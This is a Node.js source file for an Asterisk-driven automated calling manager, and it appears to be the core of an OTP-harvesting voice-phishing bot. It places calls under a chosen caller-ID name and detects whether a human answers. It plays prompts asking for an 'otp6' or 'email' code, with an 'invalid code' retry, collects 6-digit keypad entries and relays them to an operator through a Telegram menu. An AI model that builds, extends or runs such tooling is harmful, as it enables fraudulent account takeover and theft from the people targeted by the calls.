const { v4: uuidv4 } = require("uuid");
const path = require("path");
const fs = require("fs");
const AsteriskManager = require('asterisk-manager');
const EventEmitter = require('events');
const { exec } = require('child_process');
const gtts = require('google-tts-api');
const axios = require('axios');
const config = require('./config/index');

class InteractiveCallManager extends EventEmitter {
  constructor() {
    super();
    this.activeCalls = new Map();
    this.ami = null;
    this.connected = false;
    this.channelCallIdMap = new Map();
    this.setupAMI();
  }

  async setupAMI() {
    try {
      // Use the shared AMI instance from asterisk/instance.js
      const { ami: sharedAmi } = require('./asterisk/instance');
      this.ami = sharedAmi;
      
      // Check if the shared AMI is already connected
      if (this.ami.connected) {
        console.log('Using existing AMI connection');
        this.connected = true;
      } else {
        console.log('Waiting for shared AMI connection...');
        // Wait for the shared AMI to connect
        this.ami.on('connect', () => {
          console.log('Shared AMI connected for InteractiveCallManager');
          this.connected = true;
        });
        
        this.ami.on('disconnect', () => {
          console.log('Shared AMI disconnected');
          this.connected = false;
        });
      }
      
    } catch (error) {
      console.error('Error setting up shared AMI:', error);
    }
  }

  waitForConnection() {
    return new Promise((resolve) => {
      const checkConnection = () => {
        if (this.ami && this.ami.connected) {
          this.connected = true;
          console.log('AMI connection confirmed');
          resolve();
        } else {
          setTimeout(checkConnection, 100);
        }
      };
      checkConnection();
    });
  }

  handleAsteriskEvent(event) {
    console.log('Asterisk UserEvent:', event);
    const callId = this.getCallIdFromChannel(event.channel);
    
    if (!callId) return;

    switch (event.userevent) {
      case 'CallStart':
        this.updateCallProgress(callId, 'Call initiated via Asterisk');
        break;
      case 'CallAnswered':
        this.handleCallAnswered(callId, event.answertype);
        break;
      case 'HumanDetected':
        this.handleHumanDetected(callId);
        break;
      case 'VoicemailDetected':
        this.handleVoicemailDetected(callId);
        break;
      case 'AnsweringMachineDetected':
        this.handleAnsweringMachineDetected(callId);
        break;
      case 'MenuOption':
        this.handleMenuOption(callId, event.option);
        break;
      case 'StopAudio':
        this.stopCurrentAudio(callId);
        break;
      case 'DTMFCode':
        this.handleDTMFCode(callId, event.code);
        break;
      case 'InvalidCode':
        this.handleInvalidCode(callId, event.code);
        break;
      case 'WaitingForBot':
        this.emit('waitingForBot', callId);
        break;
      case 'ConnectToCaller':
        this.handleConnectToCaller(callId);
        break;
    }
  }

  async handleMenuOption(callId, option) {
    let callData = this.activeCalls.get(callId);
    
    // If call not found, try to find by partial match
    if (!callData) {
      for (let [id, call] of this.activeCalls.entries()) {
        if (id.startsWith(callId.substring(0, 10))) {
          callData = call;
          callId = id; // Use the full correct call ID
          break;
        }
      }
    }
    
    if (!callData) {
      console.error(`❌ Call ${callId} not found when handling menu option ${option}`);
      return;
    }

    // Mark that the call is now in interactive mode
    callData.interactive = true;
    callData.lastMenuOption = option;
    this.activeCalls.set(callId, callData);

    switch (option) {
      case '1':
        await this.handleDTMFOption1(callId);
        break;
      case '2':
        await this.handleDTMFOption2(callId);
        break;
      case '9':
        await this.handleDTMFOption9(callId);
        break;
    }
  }

  async handleDTMFOption1(callId) {
    // Stop any current audio
    await this.stopCurrentAudio(callId);
    // Play "please wait" message
    await this.playPleaseWaitMessage(callId);
    this.updateCallProgress(callId, 'User pressed 1 - Playing please wait message');
    // Show Telegram menu
    setTimeout(() => {
      this.emit('showTelegramMenu', callId);
    }, 2000); // Short delay
  }

  async handleDTMFOption2(callId) {
    this.updateCallProgress(callId, 'User pressed 2 - Playing associated audio');
    // Additional logic for option 2
  }

  async handleDTMFOption9(callId) {
    this.updateCallProgress(callId, 'User pressed 9 - Connecting to caller');
    // Additional logic for option 9
  }

  async stopCurrentAudio(callId) {
    console.log(`🛑 Stopping current audio for call ${callId}`);
    const callData = this.activeCalls.get(callId);
    if (callData && callData.channel && this.connected) {
      await this.ami?.action({
        action: 'redirect',
        channel: callData.channel,
        context: 'bot-commands',
        exten: 'stop-audio',
        priority: 1
      });
      console.log(`✅ Audio stopped for call ${callId}`);
    } else {
      console.log(`⚠️ Asterisk not connected or channel not found`);
    }
  }

  async handleDTMFCode(callId, code) {
    console.log(`DTMF Code received for call ${callId}: ${code}`);
    this.updateCallProgress(callId, `DTMF Code entered: ${code}`);
    this.emit('dtmfCodeReceived', callId, code);
  }

  async handleInvalidCode(callId, code) {
    console.log(`Invalid code for call ${callId}: ${code}`);
    this.updateCallProgress(callId, `Invalid code entered: ${code}`);
    this.emit('invalidCodeEntered', callId, code);
  }

  async handleCallAnswered(callId, answerType = 'unknown') {
    console.log(`Call ${callId} answered - type: ${answerType}`);
    const callData = this.activeCalls.get(callId);
    if (callData) {
      callData.answerType = answerType;
      callData.answeredAt = new Date();
      this.activeCalls.set(callId, callData);
    }
    
    this.updateCallProgress(callId, 'Call answered - analyzing...');
    this.emit('callAnswered', callId, answerType);
  }

  async handleHumanDetected(callId) {
    console.log(`Human detected for call ${callId}`);
    const callData = this.activeCalls.get(callId);
    if (callData) {
      callData.answerType = 'human';
      callData.detectionResult = 'Human detected';
      this.activeCalls.set(callId, callData);
    }
    
    this.updateCallProgress(callId, 'Human detected - playing intro');
    this.emit('humanDetected', callId);
  }

  async handleVoicemailDetected(callId) {
    console.log(`Voicemail detected for call ${callId}`);
    const callData = this.activeCalls.get(callId);
    if (callData) {
      callData.answerType = 'voicemail';
      callData.detectionResult = 'Voicemail detected';
      this.activeCalls.set(callId, callData);
    }
    
    this.updateCallProgress(callId, 'Voicemail detected - leaving message');
    this.emit('voicemailDetected', callId);
  }

  async handleAnsweringMachineDetected(callId) {
    console.log(`Answering machine detected for call ${callId}`);
    const callData = this.activeCalls.get(callId);
    if (callData) {
      callData.answerType = 'answering_machine';
      callData.detectionResult = 'Answering machine detected';
      this.activeCalls.set(callId, callData);
    }
    
    this.updateCallProgress(callId, 'Answering machine detected - waiting for beep');
    this.emit('answeringMachineDetected', callId);
  }

  async handleConnectToCaller(callId) {
    this.updateCallProgress(callId, 'Connecting to original caller');
    this.emit('connectingToCaller', callId);
  }

  async handleHangup(event) {
    const callId = this.getCallIdFromChannel(event.channel);
    if (callId) {
      this.updateCallProgress(callId, 'Call ended');
      this.emit('callEnded', callId);
    }
  }

  getCallIdFromChannel(channel) {
    return this.channelCallIdMap.get(channel);
  }

  updateCallProgress(callId, message) {
    if (this.activeCalls.has(callId)) {
      const callInfo = this.activeCalls.get(callId);
      callInfo.statusMessage = message;
      callInfo.lastUpdate = new Date();
      this.activeCalls.set(callId, callInfo);
      console.log(`Update for call ID ${callId}: ${message}`);
      this.emit('callUpdated', callId, message);
    }
  }

  async initialize() {
    console.log('Interactive Call Manager initialized');
  }

  async initiateCall(phoneNumber, name = 'Unknown') {
    const callId = uuidv4();
    this.activeCalls.set(callId, {
      phoneNumber,
      name,
      status: "initiated",
      statusMessage: "Initiating call",
      created: new Date(),
      lastUpdate: new Date(),
      currentState: 'dialing'
    });

    try {
      // Clean phone number (remove any non-numeric characters except +)
      const cleanPhone = phoneNumber.replace(/[^\d+]/g, '');
      
      console.log(`Initiating call to ${cleanPhone} (Name: ${name})`);
      
      if (this.connected) {
        // Use the correct SIP channel format from working system
        const sipChannel = `SIP/${config.sip.username}/${cleanPhone}`;
        
        // Create action ID similar to original system
        const actionId = `call-${cleanPhone}-${Date.now()}`;
        
        console.log(`Using SIP channel: ${sipChannel}`);
        console.log(`Using context: call-flow`);
        console.log(`Action ID: ${actionId}`);
        
        // Originate call through Asterisk with proper SIP configuration matching working system
        const response = await this.ami.action({
          action: 'Originate',
          channel: sipChannel,
          context: 'call-flow',
          exten: 'start', 
          priority: 1,
          actionid: actionId,
          CallerID: `"${name}" <${config.sip.username}>`,
          variable: `CALL_ID=${callId},PHONE_NUMBER=${cleanPhone},NAME=${name.replace(/, /g, '_')}`,
          timeout: 30000,
          async: true
        });

        console.log('Call originated successfully:', response);
        
        // Store the channel mapping for future reference
        if (response && response.uniqueid) {
          this.channelCallIdMap.set(response.uniqueid, callId);
        }
      } else {
        // Simulation mode for testing when not connected to Asterisk
        console.log('Asterisk not connected - using simulation mode');
        
        // Simulate call progression with delays
        setTimeout(() => {
          this.updateCallProgress(callId, 'Call answered - analyzing...');
          this.emit('callAnswered', callId, 'unknown');
        }, 2000);
        
        setTimeout(() => {
          this.updateCallProgress(callId, 'Human detected - playing intro');
          this.emit('humanDetected', callId);
        }, 4000);
      }
      
      this.updateCallProgress(callId, `Call originated to ${cleanPhone} - dialing`);
      
      return callId;
    } catch (error) {
      console.error('Error originating call:', error);
      this.updateCallProgress(callId, `Error: ${error.message}`);
      throw error;
    }
  }

  async playAudioToCall(callId, audioType) {
    console.log(`🎵 Attempting to play ${audioType} audio for call ${callId}`);
    
    // Standardize call lookup - check this manager first, then Asterisk
    let callData = this.activeCalls.get(callId);
    if (!callData) {
      try {
        const { getCallById } = require('./asterisk/instance');
        callData = getCallById(callId);
      } catch (error) {
        // Fallback if asterisk/instance is not available
      }
    }

    if (!callData || !callData.channel) {
      // Try to find the call by a partial match on the call ID if it's not found
      for (let [id, call] of this.activeCalls.entries()) {
        if (id.startsWith(callId.substring(0, 10))) { // Match first 10 chars
          callData = call;
          callId = id;
          break;
        }
      }
    }

    if (!callData) {
      throw new Error(`Call not found for ID: ${callId}`);
    }

    if (!callData.channel) {
      throw new Error(`No active channel for call ${callId}`);
    }

    let audioFile;
    switch (audioType) {
      case 'email':
        audioFile = 'uploads/email6';
        break;
      case 'otp':
      case 'otp6':
        audioFile = 'uploads/otp6';
        break;
      case 'invalid':
      case 'invalidcode':
        audioFile = 'uploads/invalidcode';
        break;
      case 'press2':
        audioFile = 'uploads/press2';
        break;
      default:
        throw new Error('Unknown audio type');
    }

    console.log(`🎵 Playing ${audioType} audio on channel ${callData.channel}`);
    
    try {
      if (this.connected && this.ami) {
        // Redirect channel to play the audio
        await this.ami.action({
          action: 'redirect',
          channel: callData.channel,
          context: 'bot-commands',
          exten: `play-${audioType}`,
          priority: 1
        });
        console.log(`✅ Audio redirect command sent successfully`);
      } else {
        console.log(`⚠️ Asterisk not connected - simulating audio playback`);
      }

      this.updateCallProgress(callId, `Playing ${audioType} audio - will collect 6-digit DTMF`);
      
      // Set the call to await DTMF input for 6-digit codes after playing audio
      this.setCallAwaitingDTMF(callId, true);
      
      // After a delay (to allow audio to finish), prompt for DTMF collection
      setTimeout(() => {
        this.playDTMFCollectionPrompt(callId);
      }, 5000); // 5 second delay for audio to finish
      
    } catch (error) {
      console.error('Error playing audio:', error);
      throw error;
    }
  }
  
  setCallAwaitingDTMF(callId, awaiting = true) {
    console.log(`🔢 Setting call ${callId} awaiting DTMF: ${awaiting}`);
    
    // Try to set on InteractiveCallManager call
    if (this.activeCalls.has(callId)) {
      const callData = this.activeCalls.get(callId);
      callData.awaitingDTMF = awaiting;
      if (awaiting) {
        callData.dtmfCode = '';
      }
      this.activeCalls.set(callId, callData);
    }
    
    // Also set on asterisk/instance call
    try {
      const { setCallAwaitingDTMF } = require('./asterisk/instance');
      setCallAwaitingDTMF(callId, awaiting);
    } catch (error) {
      console.error('Error setting asterisk/instance DTMF awaiting:', error);
    }
  }

  async playDTMFCollectionPrompt(callId) {
    console.log(`🔢 Playing DTMF collection prompt for call ${callId}`);
    
    const callData = this.activeCalls.get(callId);
    if (!callData || !callData.channel) {
      console.error(`❌ Call or channel not found for DTMF prompt: ${callId}`);
      return;
    }

    try {
      if (this.connected && this.ami) {
        await this.ami.action({
          action: 'redirect',
          channel: callData.channel,
          context: 'bot-commands',
          exten: 'collect-dtmf',
          priority: 1
        });
        console.log(`✅ DTMF collection prompt sent successfully`);
      } else {
        console.log(`⚠️ Asterisk not connected - simulating DTMF prompt`);
      }
      this.updateCallProgress(callId, 'Now listening for 6-digit DTMF code...');
    } catch (error) {
      console.error('Error playing DTMF collection prompt:', error);
    }
  }

  async playPleaseWaitMessage(callId) {
    console.log(`🕐 Playing "please wait" message for call ${callId}`);
    
    // Find the call data with proper lookup
    let callData = this.activeCalls.get(callId);
    if (!callData) {
      for (let [id, call] of this.activeCalls.entries()) {
        if (id.startsWith(callId.substring(0, 10))) {
          callData = call;
          callId = id;
          break;
        }
      }
    }

    if (!callData) {
      throw new Error(`Call not found for please wait message: ${callId}`);
    }

    try {
      if (this.connected && this.ami && callData.channel) {
        // Stop any current audio first
        await this.ami.action({
          action: 'redirect',
          channel: callData.channel,
          context: 'bot-commands',
          exten: 'stop-audio',
          priority: 1
        });
        
        // Wait a brief moment for audio to stop
        await new Promise(resolve => setTimeout(resolve, 500));
        
        // Play the "please wait" message
        await this.ami.action({
          action: 'redirect',
          channel: callData.channel,
          context: 'bot-commands',
          exten: 'play-please-wait',
          priority: 1
        });
        
        console.log(`✅ Please wait message redirect sent successfully`);
      } else {
        console.log(`⚠️ Asterisk not connected - simulating please wait message`);
      }

      this.updateCallProgress(callId, 'Please wait while your request is being processed...');
      
    } catch (error) {
      console.error('Error playing please wait message:', error);
      throw error;
    }
  }

  async playTTSMessage(callId, message) {
    try {
      // Generate TTS audio
      const url = gtts.getAudioUrl(message, {
        lang: 'en',
        slow: false,
        host: 'https://translate.google.com',
      });
      
      const response = await axios.get(url, { responseType: 'arraybuffer' });
      const audioBuffer = Buffer.from(response.data);
      
      // Save TTS file
      const ttsPath = `/tmp/tts_${callId}.mp3`;
      fs.writeFileSync(ttsPath, audioBuffer);
      
      // Convert to WAV for Asterisk
      const wavPath = `/tmp/tts_${callId}.wav`;
      await new Promise((resolve, reject) => {
        exec(`ffmpeg -i ${ttsPath} -ar 8000 -ac 1 ${wavPath}`, (error) => {
          if (error) reject(error);
          else resolve();
        });
      });

      const callData = this.activeCalls.get(callId);
      if (callData && callData.channel) {
        await this.ami.action({
          action: 'redirect',
          channel: callData.channel,
          context: 'bot-commands',
          exten: 'play-tts',
          priority: 1
        });
      }

      this.updateCallProgress(callId, 'Playing TTS message');
    } catch (error) {
      console.error('Error playing TTS:', error);
      throw error;
    }
  }

  async handleButtonClick(callId, buttonId) {
    console.log(`Button clicked for call ${callId}: ${buttonId}`);
    
    switch (buttonId) {
      case 'email':
        await this.playAudioToCall(callId, 'email');
        break;
      case 'otp6':
        await this.playAudioToCall(callId, 'otp');
        break;
      case 'invalidcode':
        await this.playAudioToCall(callId, 'invalid');
        break;
      default:
        throw new Error('Unknown button ID');
    }

    return { success: true, message: `Playing ${buttonId} audio` };
  }

  async setupTTSRecordings(callId, recordings) {
    if (!this.activeCalls.has(callId)) {
      throw new Error('Call not found');
    }

    const callData = this.activeCalls.get(callId);
    callData.ttsRecordings = recordings;
    this.activeCalls.set(callId, callData);

    console.log(`TTS recordings setup for call ${callId}:`, recordings);
  }

  async uploadAudioForCall(callId, audioPath) {
    if (!this.activeCalls.has(callId)) {
      throw new Error('Call not found');
    }

    const callData = this.activeCalls.get(callId);
    callData.customAudioPath = audioPath;
    this.activeCalls.set(callId, callData);

    console.log(`Audio uploaded for call ${callId}: ${audioPath}`);
  }

  async handleDTMF(callId, digit) {
    console.log(`DTMF received for call ${callId}: ${digit}`);
    
    const callData = this.activeCalls.get(callId);
    if (!callData) {
      throw new Error('Call not found');
    }

    // This will be handled by the Asterisk dialplan and UserEvents
    return { success: true, message: `DTMF ${digit} processed` };
  }

  async getCallStatus(callId) {
    if (!this.activeCalls.has(callId)) {
      throw new Error('Call not found');
    }
    return this.activeCalls.get(callId);
  }

  async getActiveCalls() {
    return Array.from(this.activeCalls.entries());
  }

  async sendManualDTMF(callId, digit) {
    console.log(`Sending manual DTMF for call ${callId}: ${digit}`);
    
    const callData = this.activeCalls.get(callId);
    if (!callData) {
      throw new Error('Call not found');
    }

    // Store the current state and set to waiting for DTMF response
    callData.waitingForDTMFResponse = true;
    callData.lastDTMFDigit = digit;
    this.activeCalls.set(callId, callData);

    // Simulate DTMF processing - in real implementation, this would send to Asterisk
    this.updateCallProgress(callId, `Manual DTMF sent: ${digit}`);
    
    // Handle the digit like a received DTMF
    if (digit === '1') {
      // Show Telegram menu for the 3 options to the bot user
      this.emit('showTelegramMenu', callId);
      return { success: true, message: `DTMF ${digit} sent - showing Telegram menu to bot user` };
    } else {
      // For other digits, just process normally
      this.emit('dtmfCodeReceived', callId, digit);
      return { success: true, message: `DTMF ${digit} sent and processed` };
    }
  }

  async sendDTMFCode(callId, code) {
    console.log(`Sending DTMF code for call ${callId}: ${code}`);
    
    const callData = this.activeCalls.get(callId);
    if (!callData) {
      throw new Error('Call not found');
    }

    // Store the DTMF code
    callData.lastDTMFCode = code;
    this.activeCalls.set(callId, callData);

    this.updateCallProgress(callId, `DTMF code entered: ${code}`);
    
    // Send the code to the bot user
    this.emit('dtmfCodeReceived', callId, code);
    
    return { success: true, message: `DTMF code ${code} sent to bot user` };
  }

  async showDTMFOptions(callId) {
    console.log(`Showing DTMF options for call ${callId}`);
    
    const callData = this.activeCalls.get(callId);
    if (!callData) {
      throw new Error('Call not found');
    }

    // Set state to show DTMF options
    callData.showingDTMFOptions = true;
    this.activeCalls.set(callId, callData);

    this.updateCallProgress(callId, 'Showing DTMF input options');
    this.emit('showDTMFOptions', callId);
    
    return { success: true, message: 'DTMF options displayed' };
  }


  async endCall(callId) {
    const callData = this.activeCalls.get(callId);
    if (!callData) {
      throw new Error('Call not found');
    }

    if (callData.channel && this.connected) {
      try {
        await this.ami.action({
          action: 'hangup',
          channel: callData.channel
        });
      } catch (error) {
        console.error('Error hanging up call:', error);
      }
    }

    this.activeCalls.delete(callId);
    this.channelCallIdMap.delete(callData.channel);
    console.log(`Call ${callId} ended`);
  }
}

module.exports = { InteractiveCallManager };
